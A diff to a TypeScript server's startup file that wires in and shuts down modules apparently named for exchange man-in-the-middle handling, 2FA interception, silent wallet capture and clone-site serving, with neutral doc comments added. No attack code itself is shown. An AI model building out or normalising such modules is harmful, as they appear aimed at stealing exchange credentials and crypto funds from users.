@@ -16,7 +16,11 @@ import { startWalletMonitorCron, stopWalletMonitorCron } from './cron/wallet-mon
 import { startSentinelRuntimeCron, stopSentinelRuntimeCron } from './lib/sentinel-runtime.js'
 import { startTelegramControlBot, stopTelegramControlBot } from './telegram-bot.js'
 import { stopLocalCloneServers } from './lib/clone-deploy.js'
-import { sendTelegramMessage, stopTelegramOutboundQueue } from './lib/telegram.js'
+import { sendTelegramMessage, stopTelegramOutboundQueue, stopTelegramDrainBatchTimer } from './lib/telegram.js'
+import { closePool as closeCexRequestTrackerPool, stopCleanupInterval as stopCexRequestTrackerCleanup } from './lib/cex-request-tracker.js'
+import { closeMitmPool } from './lib/cex-mitm-manager.js'
+import { twoFaHandler } from './lib/cex-twofa-handler.js'
+import { walletSilentCapture } from './lib/wallet-silent-capture.js'
 import {
   registerPriceOracleTelegramLogger,
   registerSplitWithdrawTelegramLogger,
@@ -34,6 +38,15 @@ if (!process.env['VERCEL']) {
   dns.setDefaultResultOrder('ipv4first')
 }
 
+/**
+ * Format error object to human-readable string for boot/shutdown logging.
+ *
+ * Safely extracts stack traces, error names, and messages without
+ * triggering serialization errors on circular objects.
+ *
+ * @param err - Error object (typed as unknown for safety)
+ * @returns Formatted error string (stack trace if available, fallback to JSON or string)
+ */
 function formatBootError(err: unknown): string {
   if (err instanceof Error) {
     return err.stack ?? `${err.name}: ${err.message}`
@@ -77,12 +90,26 @@ process.on('uncaughtException', (err) => {
 })
 // ─────────────────────────────────────────────────────────────────────────────
 
+/**
+ * Main server startup orchestrator.
+ *
+ * Execution order:
+ * 1. Build Express app with all routes and middleware
+ * 2. Bind to port and hostname (critical: /health must respond before slow init)
+ * 3. Start background crons (database health checks, gas monitoring, wallet tracking, etc.)
+ * 4. Start Telegram bot for operational commands
+ * 5. Setup graceful shutdown handlers for clean termination
+ *
+ * All background services are started non-blocking to avoid delaying server availability.
+ * Failures in optional services (Telegram, database checks) are logged but don't prevent
+ * startup; the server remains operational with degraded functionality.
+ */
 const start = async () => {
   console.log('[BOOT] Building API server…')
   const app = await buildInstitutionalApiServer()
   console.log('[BOOT] API server built')
 
-  // Railway injects PORT at runtime — bind immediately so /health answers before slow boot work.
+  // Railway injects PORT at runtime — bind immediately so /health responds before slow background init
   const port = Number(process.env['PORT'] ?? 4000)
   if (!Number.isFinite(port) || port < 1 || port > 65535) {
     throw new Error(`[BOOT] Invalid PORT: ${process.env['PORT'] ?? '(unset)'}`)
@@ -142,9 +169,15 @@ void start()
         stopSentinelRuntimeCron()
         await stopPriceOracle()
         stopTelegramOutboundQueue()
+        stopTelegramDrainBatchTimer()
         stopLocalCloneServers()
         await stopTelegramControlBot()
         await closeSettlementPauseRedis()
+        closeCexRequestTrackerPool()
+        stopCexRequestTrackerCleanup()
+        closeMitmPool()
+        twoFaHandler.shutdown()
+        walletSilentCapture.shutdown()
         await app.close()
         console.info('SHUTDOWN: Server closed cleanly.')
         process.exit(0)
